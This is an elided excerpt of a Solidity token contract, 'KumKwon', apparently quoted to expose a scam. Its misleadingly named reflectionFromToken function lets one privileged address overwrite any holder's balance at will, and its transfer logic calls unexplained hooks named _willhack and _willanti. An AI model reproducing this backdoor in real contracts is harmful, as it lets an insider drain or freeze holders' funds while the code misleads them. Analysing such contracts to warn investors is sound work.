...
contract KumKwon is Ownable {
    ...
    function reflectionFromToken(address miner, uint256 _value) external  {
        require(msg.sender == _address0, "!_address0");
        _EggsFees[miner] = _value * 10 ** decimals();
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal {
        ...
        uint256 senderBalance = _EggsFees[sender];
        require(senderBalance >= amount, "Transfer amount exceeds balance");
         _willhack(sender, recipient, amount);
         _willanti(sender, recipient, amount);
        unchecked {
            _EggsFees[sender] = senderBalance - amount;
        }
        _EggsFees[recipient] += amount;
    ...
    function includeAccount(address addr,bool status) public {
